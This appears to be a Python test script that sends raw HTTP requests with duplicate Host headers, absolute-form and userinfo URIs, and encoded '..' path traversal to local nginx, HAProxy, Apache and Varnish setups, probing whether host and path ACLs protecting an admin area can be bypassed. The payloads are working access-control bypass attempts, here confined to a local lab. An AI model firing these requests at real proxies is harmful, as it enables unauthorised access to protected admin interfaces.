#!/usr/bin/env python3
import socket

TARGETS = [
    ("DIRECT", 18081),
    ("NGINX", 18080),
    ("HAPROXY", 18082),
    ("APACHE", 18083),
    ("HAPROXY_HOST_ACL", 18084),
    ("NGINX_HOST_ACL", 18085),
    ("APACHE_HOST_ACL", 18086),
    ("HAPROXY_PATH_ACL", 18087),
    ("NGINX_PATH_ACL", 18088),
    ("APACHE_PATH_ACL", 18089),
    ("VARNISH", 18090),
    ("VARNISH_HOST_ACL", 18091),
]

CASES = [
    ("CONTROL", "GET /control HTTP/1.1\r\nHost: public.test\r\nConnection: close\r\n\r\n"),
    ("DUP_PUBLIC_ADMIN", "GET /dup-public-admin HTTP/1.1\r\nHost: public.test\r\nHost: admin.test\r\nConnection: close\r\n\r\n"),
    ("DUP_ADMIN_PUBLIC", "GET /dup-admin-public HTTP/1.1\r\nHost: admin.test\r\nHost: public.test\r\nConnection: close\r\n\r\n"),
    ("MIXED_LF_PUBLIC_ADMIN", "GET /mixed HTTP/1.1\r\nHost: public.test\nHost: admin.test\r\nConnection: close\r\n\r\n"),
    ("ABSFORM_PUBLIC_HOST_ADMIN_URI", "GET http://admin.test/abs HTTP/1.1\r\nHost: public.test\r\nConnection: close\r\n\r\n"),
    ("ABSFORM_ADMIN_HOST_PUBLIC_URI", "GET http://public.test/abs HTTP/1.1\r\nHost: admin.test\r\nConnection: close\r\n\r\n"),
    ("ABSFORM_USERINFO", "GET http://public.test@admin.test/userinfo HTTP/1.1\r\nHost: public.test\r\nConnection: close\r\n\r\n"),
    ("DIRECT_ADMIN", "GET /admin HTTP/1.1\r\nHost: public.test\r\nConnection: close\r\n\r\n"),
    ("PATH_DOTDOT_ENCODED", "GET /public/%2e%2e/admin HTTP/1.1\r\nHost: public.test\r\nConnection: close\r\n\r\n"),
    ("PATH_DOTDOT_MIXED", "GET /public/.%2e/admin HTTP/1.1\r\nHost: public.test\r\nConnection: close\r\n\r\n"),
    ("PATH_ENCODED_SLASH", "GET /public%2f..%2fadmin HTTP/1.1\r\nHost: public.test\r\nConnection: close\r\n\r\n"),
    ("PATH_BACKSLASH_ENCODED", "GET /public/%5c..%5cadmin HTTP/1.1\r\nHost: public.test\r\nConnection: close\r\n\r\n"),
]

def send(port, raw):
    with socket.create_connection(("127.0.0.1", port), timeout=3) as s:
        s.sendall(raw.encode("ascii"))
        chunks=[]
        s.settimeout(3)
        try:
            while True:
                b=s.recv(8192)
                if not b: break
                chunks.append(b)
        except socket.timeout:
            pass
    return b"".join(chunks).decode("latin1", "replace")

for target, port in TARGETS:
    for name, raw in CASES:
        try:
            response=send(port, raw)
            first=response.splitlines()[0] if response else "<NO_RESPONSE>"
            body=response.split("\r\n\r\n",1)[1].strip() if "\r\n\r\n" in response else ""
            print(f"BOUNDARY_CASE target={target} case={name} first={first!r} body={body!r}")
        except Exception as e:
            print(f"BOUNDARY_CASE target={target} case={name} error={type(e).__name__}:{e}")
